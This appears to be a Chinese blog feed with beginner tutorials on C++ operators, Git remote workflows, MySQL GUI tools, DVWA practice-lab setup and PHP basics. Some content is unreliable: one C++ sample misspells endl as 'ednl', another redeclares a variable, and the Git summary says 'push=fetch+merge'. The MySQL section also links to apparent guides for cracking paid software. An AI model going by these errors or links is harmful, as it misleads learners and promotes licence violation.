<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">3</span>;</span><br><span class="line">    cout&lt;&lt;a+b&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;a-b&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;a/b&lt;&lt;endl;<span class="comment">//C++规定，两个整数相除，结果仍然为整数，会舍去剩下的小数</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">double</span> c = <span class="number">3.14</span>;</span><br><span class="line">    <span class="keyword">double</span> d = <span class="number">4.23</span>;<span class="comment">//此处也可写为    double c=3.14,d=4.23;</span></span><br><span class="line">    cout&lt;&lt;c/d&lt;&lt;endl;<span class="comment">//该结果为小数</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><u>除法运算和取模运算的除数不能为0</u></p>
<p>取模运算如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">4</span>,b=<span class="number">3</span>;</span><br><span class="line">    cout&lt;&lt;a%b&lt;&lt;endl;</span><br><span class="line">    <span class="comment">//注意：取模运算不能为小数</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前/后置递增/减如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">int</span> a = ++b*<span class="number">10</span>;<span class="comment">//先加1后参与运算</span></span><br><span class="line">    cout&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">int</span> b =<span class="number">3</span>;</span><br><span class="line">    <span class="keyword">int</span> c = b++*<span class="number">10</span>;<span class="comment">//先参与运算再加1</span></span><br><span class="line">    cout&lt;&lt;c&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="3-赋值运算符"><a href="#3-赋值运算符" class="headerlink" title="3.赋值运算符"></a>3.赋值运算符</h1><table>
<thead>
<tr>
<th>运算符</th>
<th>术语</th>
<th>示例</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>=</td>
<td>赋值</td>
<td>a=2;b=3;</td>
<td>a=2;b=3;</td>
</tr>
<tr>
<td>+=</td>
<td>加等于</td>
<td>a=0;a+=2;</td>
<td>a=2;</td>
</tr>
<tr>
<td>-=</td>
<td>减等于</td>
<td>a=5;a-=3;</td>
<td>a=2;</td>
</tr>
<tr>
<td>*=</td>
<td>乘等于</td>
<td>a=2;a*=2;</td>
<td>a=4;</td>
</tr>
<tr>
<td>/=</td>
<td>除等于</td>
<td>a=4;a/=2;</td>
<td>a=2;</td>
</tr>
<tr>
<td>%=</td>
<td>模等于</td>
<td>a=3;a%=2;</td>
<td>a=1;</td>
</tr>
</tbody></table>
<p>详细使用方法如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a =<span class="number">0</span>;<span class="comment">//该处也可用 int a; 来引入变量a</span></span><br><span class="line">    a = <span class="number">10</span>;</span><br><span class="line">    cout&lt;&lt;a&lt;&lt;ednl;</span><br><span class="line">    </span><br><span class="line">    a=<span class="number">10</span>;</span><br><span class="line">    a+=<span class="number">2</span>;<span class="comment">//表示a=a+2</span></span><br><span class="line">    cout&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    a=<span class="number">10</span>;</span><br><span class="line">    a-=<span class="number">2</span>;<span class="comment">//表示a=a-2</span></span><br><span class="line">    cout&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    a=<span class="number">10</span>;</span><br><span class="line">    a%=<span class="number">3</span>;<span class="comment">//表示a=a%3</span></span><br><span class="line">    cout&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="4-比较运算符"><a href="#4-比较运算符" class="headerlink" title="4.比较运算符"></a>4.比较运算符</h1><p>作用：用于表达式的比较，并返回真假值</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>术语</th>
<th>示例</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>==</td>
<td>相等于</td>
<td>4==3</td>
<td>0</td>
</tr>
<tr>
<td>!=</td>
<td>不等于</td>
<td>4!=3</td>
<td>1</td>
</tr>
<tr>
<td>&lt;</td>
<td>小于</td>
<td>4&lt;3</td>
<td>0</td>
</tr>
<tr>
<td>&gt;</td>
<td>大于</td>
<td>4&gt;3</td>
<td>1</td>
</tr>
<tr>
<td>&lt;=</td>
<td>小于等于</td>
<td>4&lt;=3</td>
<td>0</td>
</tr>
<tr>
<td>&gt;=</td>
<td>大于等于</td>
<td>4&gt;=3</td>
<td>1</td>
</tr>
</tbody></table>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">4</span>,b=<span class="number">3</span>;</span><br><span class="line">    cout&lt;&lt;(a==b)&lt;&lt;endl;<span class="comment">//此处没有括号不对，括号表示优先运算，初学者可以看成一种语法</span></span><br><span class="line">    cout&lt;&lt;(a!=b)&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;(a&gt;b)&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;(a&lt;=b)&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="5-逻辑运算符"><a href="#5-逻辑运算符" class="headerlink" title="5.逻辑运算符"></a>5.逻辑运算符</h1><table>
<thead>
<tr>
<th>运算符</th>
<th>术语</th>
<th>示例</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>!</td>
<td>非</td>
<td>!a</td>
<td>与a的真假相反</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>与</td>
<td>a&amp;&amp;b</td>
<td>a和b均为真时为真，否则为假</td>
</tr>
<tr>
<td>||</td>
<td>或</td>
<td>a||b</td>
<td>a和b中有一个真即为真，否则为假</td>
</tr>
</tbody></table>
<p>示例如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">10</span>;</span><br><span class="line">    cout&lt;&lt;!a&lt;&lt;endl;<span class="comment">//在C++中的数字，除了0其余都为真</span></span><br><span class="line">    cout&lt;&lt;!!a&lt;&lt;endl;<span class="comment">//该值为真，即为1</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> b=<span class="number">0</span>;</span><br><span class="line">    cout&lt;&lt;(a&amp;&amp;b)&lt;&lt;endl;<span class="comment">//注意该处的优先运算括号</span></span><br><span class="line">    b=<span class="number">1</span>;</span><br><span class="line">    cout&lt;&lt;(a&amp;&amp;b)&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    a=<span class="number">1</span>,b=<span class="number">0</span>;</span><br><span class="line">    cout&lt;&lt;(a||b)&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Git远程库相关操作</title>
    <url>/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h1 id="添加远程库及推送"><a href="#添加远程库及推送" class="headerlink" title="添加远程库及推送"></a>添加远程库及推送</h1><p>命令：<code>git remote add 地址名 HTTP或SSH地址</code></p>
<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111201215014.png" alt="image-20220111201215014"></p>
<p>执行完后，如以下页面</p>
<span id="more"></span>

<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111201612020.png" alt="image-20220111201612020"></p>
<p>推送命令：<code>git push 地址名 分支名</code>，执行后报错</p>
<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111202306396.png" alt="image-20220111202306396"></p>
<p>因为git在拉取或者提交项目时，中间会有git的http和https代理，但是我们本地环境本身就有SSL协议了，所以取消git的https代理即可，不行再取消http的代理。</p>
<p>取消指令为：</p>
<p>取消http代理<br><code>git config --global --unset http.proxy</code><br>取消https代理<br><code>git config --global --unset https.proxy</code></p>
<p>也可以直接用ssh地址，设置ssh协议的方法可参考<a href="https://zhuanlan.zhihu.com/p/103391101">这里</a></p>
<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111202436988.png" alt="image-20220111202436988"></p>
<p>然后查看远程库，即可发现文件</p>
<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111202501488.png" alt="image-20220111202501488"></p>
<h1 id="克隆远程库到本地"><a href="#克隆远程库到本地" class="headerlink" title="克隆远程库到本地"></a>克隆远程库到本地</h1><p>命令：<code>git clone 克隆地址</code>，克隆地址为下（克隆不需要再初始化）</p>
<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111203222264.png" alt="image-20220111203222264"></p>
<p>操作如下</p>
<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111203419197.png" alt="image-20220111203419197"></p>
<p>克隆的三个操作</p>
<ul>
<li>完整的把远程库下载到本地</li>
<li>创建origin远程库地址别名</li>
<li>初始化本地库</li>
</ul>
<h2 id="推送本地库到远程库"><a href="#推送本地库到远程库" class="headerlink" title="推送本地库到远程库"></a>推送本地库到远程库</h2><p>命令：<code>git push 远程库地址别名 分支名</code>（前提是，发出提交的Github账户在该团队内，邀请在GitHub内进行）</p>
<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111212540339.png" alt="image-20220111212540339"></p>
<p>邀请加入后</p>
<p>这里仍然要用ssh协议</p>
<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111210851950.png" alt="image-20220111210851950"></p>
<p>内容推送上去后，远程库内容改变</p>
<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111211327947.png" alt="image-20220111211327947"></p>
<h1 id="拉取远程库到本地库"><a href="#拉取远程库到本地库" class="headerlink" title="拉取远程库到本地库"></a>拉取远程库到本地库</h1><p>然后切换另一编辑者，也就是库的创建者</p>
<p>执行抓取操作：<code>git fetch 地址别名 分支</code></p>
<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111211608126.png" alt="image-20220111211608126"></p>
<p>抓取下来后可看到，本地库文件并没有改变</p>
<p>切换分支：<code>git checkout 地址别名/分支名</code></p>
<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111211801979.png" alt="image-20220111211801979"></p>
<p>可看到，内容已经改变（多了一行g）</p>
<p>然后要将远程库合并到本地库就要切换到master分支，然后执行：<code>git merge 地址别名/分支名</code></p>
<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111220729815.png" alt="image-20220111220729815"></p>
<p>以上适用于需要检查代码的情况，比较麻烦</p>
<p>若是追求简单，则可直接执行：<code>git pull 地址别名 分支名</code>同样可拿到远程库内容</p>
<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111220915812.png" alt="image-20220111220915812"></p>
<p><strong><u>总结：push=fetch+merge</u></strong></p>
<h1 id="推送时的矛盾"><a href="#推送时的矛盾" class="headerlink" title="推送时的矛盾"></a>推送时的矛盾</h1><p>若两个人同时对远程库进行推送，则推送晚者不能推送，只能拉取最新的库，然后再进行修改、推送</p>
<p>冲突页面如下</p>
<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111221428737.png" alt="image-20220111221428737"></p>
<p>拉取远程库文件</p>
<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111221617497.png" alt="image-20220111221617497"></p>
<p>打开冲突的文件</p>
<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111221505181.png" alt="image-20220111221505181"></p>
<p>删去多余行目，然后提交到本地库</p>
<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111221923785.png" alt="image-20220111221923785"></p>
<p>然后再推送到远程库</p>
<p><img src="/2022/01/11/Git%E8%BF%9C%E7%A8%8B%E5%BA%93%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/image-20220111222029729.png" alt="image-20220111222029729"></p>
<p><strong>这种机制的目的避免了推送混乱</strong></p>
]]></content>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL常用的图形管理工具</title>
    <url>/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>日常开发中，如果在类似dos窗口中进行，对于初学者来说，上手难度高，也显得枯燥乏味，所以我们用MySQL图形管理工具来连接MySQL，然后在图形化界面上操作。</p>
<p>MySQL的管理维护工具非常多，除了系统自带的命令行管理工具外，还有许多其他的图形管理工具。</p>
<p><img src="/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/image-20220113170325596.png" alt="image-20220113170325596"></p>
<h1 id="常用工具介绍"><a href="#常用工具介绍" class="headerlink" title="常用工具介绍"></a>常用工具介绍</h1><h2 id="Navicat（第一批队）"><a href="#Navicat（第一批队）" class="headerlink" title="Navicat（第一批队）"></a>Navicat（第一批队）</h2><p>Navicat是一套快速、可靠的数据库管理工具，Navicat是以直觉化的图形用户界面而建的，可以兼容多种昂数据库，支持多种操作系统。</p>
<span id="more"></span>

<h2 id="SQLyog（第一批队）"><a href="#SQLyog（第一批队）" class="headerlink" title="SQLyog（第一批队）"></a>SQLyog（第一批队）</h2><p>SQLyog是一个快速而简洁的图形化管理MySQL数据库工具，他能后在任何地方有效管理你的数据库，由业界著名的Webyog公司出品</p>
<p>使用SQLyog可以快速直观地让您从世界的任何角落通过网络来维护远端的MySQL数据库</p>
<h2 id="MySQL-Workbench（第一批队）"><a href="#MySQL-Workbench（第一批队）" class="headerlink" title="MySQL Workbench（第一批队）"></a>MySQL Workbench（第一批队）</h2><p>MySQL Workbench是MySQL官方提供的图形化管理工具，分为社区版和商业版，社区版完全免费，而商业版则是按年收费。支持数据库的创建、设计、迁移、备份、到处和导入等功能，并且支持Windows、Linux和mac等主流的操作系统</p>
<h2 id="DataGrip（第二批队）"><a href="#DataGrip（第二批队）" class="headerlink" title="DataGrip（第二批队）"></a>DataGrip（第二批队）</h2><p>DataGrip是大名鼎鼎的JetBrains公司出品的，就是那个出品Intellij IDEA的公司。</p>
<p>DataGrip是一款数据库管理客户端工具，方便连接到数据库服务，执行sql、创建表、创建索引以及导出数据等。</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
<li>phpMyAdmin</li>
<li>MySQLDumper</li>
<li>MySQL GUI Tools（官网提供）</li>
<li>MySQL ODBS Connector</li>
</ul>
<h1 id="图形管理工具安装"><a href="#图形管理工具安装" class="headerlink" title="图形管理工具安装"></a>图形管理工具安装</h1><h2 id="Navicat的安装"><a href="#Navicat的安装" class="headerlink" title="Navicat的安装"></a>Navicat的安装</h2><p>去<a href="https://navicat.com.cn/products">官网</a>下载安装包（<a href="https://cloud.tencent.com/developer/article/1804255">白嫖请参考</a>）并安装</p>
<p><img src="/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/image-20220113173117017.png" alt="image-20220113173117017"></p>
<p>安装完成后</p>
<p><img src="/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/image-20220113174323767.png" alt="image-20220113174323767"></p>
<h2 id="SQLyog的安装"><a href="#SQLyog的安装" class="headerlink" title="SQLyog的安装"></a>SQLyog的安装</h2><p><a href="https://sqlyog.softonic.nl/">点击此处</a>下载安装包，下载完成后安装（<a href="https://www.cnblogs.com/pengpengdeyuan/p/14364777.html">白嫖参考</a>也可以下载<a href="https://github.com/webyog/sqlyog-community/wiki/Downloads">社区版</a>）</p>
<p><img src="/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/image-20220113175137345.png" alt="image-20220113175137345"></p>
<p>一直点下一步即可</p>
<p><img src="/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/image-20220113184750571.png" alt="image-20220113184750571"></p>
<h1 id="图形化管理工具连接MySQL"><a href="#图形化管理工具连接MySQL" class="headerlink" title="图形化管理工具连接MySQL"></a>图形化管理工具连接MySQL</h1><h2 id="Navicat连接"><a href="#Navicat连接" class="headerlink" title="Navicat连接"></a>Navicat连接</h2><p><img src="/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/image-20220113190355479.png" alt="image-20220113190355479"></p>
<p>注意：此时主机连接的是本地地址，若是远程的要输入对应ip</p>
<p>连接成功后</p>
<p><img src="/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/image-20220113190605114.png" alt="image-20220113190605114"></p>
<h2 id="SQLyog连接"><a href="#SQLyog连接" class="headerlink" title="SQLyog连接"></a>SQLyog连接</h2><p><img src="/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/image-20220113191121646.png" alt="image-20220113191121646"></p>
<p>点击是，连接成功</p>
<p><img src="/2022/01/13/MySQL%E5%B8%B8%E7%94%A8%E7%9A%84%E5%9B%BE%E5%BD%A2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/image-20220113191138375.png" alt="image-20220113191138375"></p>
]]></content>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPstudy+Win7搭建ＤＶＷＡ靶场</title>
    <url>/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/</url>
    <content><![CDATA[<h1 id="1-安装虚拟机"><a href="#1-安装虚拟机" class="headerlink" title="1.安装虚拟机"></a>1.安装虚拟机</h1><p>这里我用的时VMware，可以直接百度搜索，然后下载即可。之后要去找一个Win7的系统静像，这里推荐去<a href="https://msdn.itellyou.cn/"> I Tell You</a>下载。然后就是配置虚拟机</p>
<span id="more"></span>

<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211174106598.png" alt="image-20211211174106598"></p>
<p>点击创建新的虚拟机，然后选定刚才下载的Win7静像，即可创建。创建完成后要进行VMware Tools的安装（目的是要实现与物理机的粘贴与复制），打开此处的设置</p>
<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211174722062.png" alt="image-20211211174722062"></p>
<p>这里要将CD和软盘的连接都设置为 使用物理驱动器 </p>
<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211174757258.png" alt="image-20211211174757258"></p>
<p>然后进行VMware Tools的安装（如果不设置无法安装）。这里建议安装后为系统拍摄快照。</p>
<h1 id="2-安装PHPstudy和DVWA"><a href="#2-安装PHPstudy和DVWA" class="headerlink" title="2.安装PHPstudy和DVWA"></a>2.安装PHPstudy和DVWA</h1><p>安装之后直接直接在浏览器里面下载phpstudy，之后安装以下套件</p>
<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211181907791.png" alt="image-20211211181907791"></p>
<p>然后找到以下文件夹</p>
<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211182353767.png" alt="image-20211211182353767"></p>
<p>将事先下载好的DVWA-master文件夹移入，然后打开文件夹的如下位置</p>
<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211182626782.png" alt="image-20211211182626782"></p>
<p>并将里面文件复制后去掉.dist保存，再将其打开，修改其中数据：</p>
<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211182721061.png" alt="image-20211211182721061"></p>
<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211182928405.png" alt="image-20211211182928405"></p>
<p>然后在浏览器中输入地址 ：<a href="http://127.0.0.1/DVWA-master/setup.php">http://127.0.0.1/DVWA-master/setup.php</a></p>
<p>拉到最下面点击按钮</p>
<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211182947997.png" alt="image-20211211182947997"></p>
<p>之后进入登录页面</p>
<p><img src="/2021/12/11/PHPstudy-Win7%E6%90%AD%E5%BB%BADVWA%E9%9D%B6%E5%9C%BA/image-20211211183019265.png" alt="image-20211211183019265"></p>
<p>账号：admin</p>
<p>密码：password</p>
<p>登录成功后即可进入</p>
]]></content>
      <tags>
        <tag>PHPstudy</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP环境搭建</title>
    <url>/2022/01/29/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="PHP简介"><a href="#PHP简介" class="headerlink" title="PHP简介"></a>PHP简介</h1><h2 id="PHP定义"><a href="#PHP定义" class="headerlink" title="PHP定义"></a>PHP定义</h2><p>PHP定义：一种<strong>服务器端</strong>的 HTML <strong>脚本/编程语言</strong>,是一种简单的、面向对象的、解释型的、健壮的、安全的、性能非常之高的、独立于架构的、可移植的、动态的脚本语言。是一种广泛用于 Open Source（开放源代码）的尤其适合 Web 开发并可以嵌入 HTML 的多用途脚本语言。它的语法接近 C，Java 和 Perl，而且容易学习。该语言让 Web 开发人员快速的书写<strong>动态</strong>生成的网页。</p>
 <span id="more"></span>

<p>PHP前身：Personal HomePage，个人主页，使用Perl语言开发的一种写个人主页的语言</p>
<p>PHP：PHP Hypertext Preprosessor，php超文本预处理器，底层使用C语言</p>
<p>平台支持（window，Linux，UNIX）</p>
<p>数据库支持（Sqlserver，mysql，Oracle，Access）</p>
<h1 id="网站相关的基本概念"><a href="#网站相关的基本概念" class="headerlink" title="网站相关的基本概念"></a>网站相关的基本概念</h1><h2 id="网站的动与静"><a href="#网站的动与静" class="headerlink" title="网站的动与静"></a>网站的动与静</h2><h3 id="静态网站特点"><a href="#静态网站特点" class="headerlink" title="静态网站特点"></a>静态网站特点</h3><ol>
<li>网页内容一经发布到网站服务器上，无论是否有用户访问，每个静态网页的内容都是保存在网站服务器上的，也就是说，静态网页是实实在在保存在服务器上的文件，每个网页都是一个独立的文件；</li>
<li>静态网页的内容相对稳定，因此<strong>容易被搜索引擎检索</strong>；</li>
<li>静态网页<strong>没有数据库的支持</strong>，在网站制作和维护方面工作量较大，因此当网站信息量很大时完全依靠静态网页制作方式比较困难； </li>
<li>静态网页的<strong>交互性较差</strong>，在功能方面有较大的限制。</li>
</ol>
<h3 id="动态网站特点"><a href="#动态网站特点" class="headerlink" title="动态网站特点"></a>动态网站特点</h3><ol>
<li>交互性：<strong>网页会根据用户的要求和选择而动态地改变和响应</strong>，浏览器作为客户端，成为一个动态交流的桥梁，动态网页的交互性也是今后Web发展的潮流。</li>
<li>自动更新：即无须手动更新HTML文档，便会自动生成新页面，可以大大节省工作量。</li>
<li><strong>因时因人而变</strong>：即当不同时间、不同用户访问同一网址时会出现不同页面。</li>
<li>此外动态网页是与静态网页相对应的，也就是说，网页URL的后缀不是.htm、.html、.shtml、.xml等静态网页的常见形式，而是以.asp、.jsp、.php、.perl、.cgi等形式为后缀。在动态网页网址中有一个<strong>标志性的符号——“?”</strong></li>
</ol>
<h2 id="服务器概念"><a href="#服务器概念" class="headerlink" title="服务器概念"></a>服务器概念</h2><p>服务器（server），也称伺服器，是提供计算服务的设备。由于服务器需要响应服务请求，并进行处理，因此一般来说服务器应具备承担服务并且保障服务的能力。</p>
<p>服务器的构成包括处理器、硬盘、内存、系统总线等，和通用的计算机架构类似，但是由于需要提供高可靠的服务，因此在处理能力、稳定性、可靠性、安全性、可扩展性、可管理性等方面要求较高。</p>
<p>在网络环境下，根据服务器提供的服务类型不同，分为文件服务器，数据库服务器，应用程序服务器，WEB服务器等。</p>
<p>服务器：能够提供服务的机器，<strong>取决于机器上所安装的软件</strong>（服务软件）</p>
<p>Web服务器：提供web服务（网站访问），就需要安装web服务软件，Apache，tomcat，iis等</p>
